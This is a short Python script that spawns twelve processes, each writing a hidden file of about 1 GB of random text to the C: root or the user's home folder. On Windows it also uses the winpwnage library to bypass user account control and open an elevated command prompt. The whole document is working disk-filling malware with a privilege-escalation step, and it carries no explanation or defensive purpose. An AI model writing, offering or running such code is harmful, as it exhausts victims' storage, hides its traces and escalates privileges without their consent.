import os
import string
import random
import platform
import multiprocessing as mp

GB = 1000 ** 3
CSZE = 100
os_name = platform.system()

if os_name == "Windows":
    from winpwnage.functions.uac.uacMethod2 import uacMethod2

os.system("cls" if os.name == "nt" else "clear")

def tff():
    c = string.printable
    return "".join(random.choices(c, k=len(c))) * 1000


def change_os():
    if os_name == "Windows":
        return "C:"
    elif os_name == "Linux":
        return os.path.expanduser("~")
    else:
        print("Platform not supported.")


def write_file(i):
    base_path = change_os()
    filename = f"{base_path}/.00{i}"
    
    with open(filename, "w", buffering=CSZE * 100) as file:
        if os_name == "Windows":
            uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
            os.system("attrib +h " + filename)
            
        while True:
            text = tff()
            for _ in range(100):
                file.write(text)
            if os.path.getsize(filename) >= GB:
                file.flush()
                break


def main():
    processes = []
    for x in range(0, 12):
        processes.append(mp.Process(target=write_file, args=(f"{x+1}000",)))
        processes[x].start()

if __name__ == "__main__":
    main()
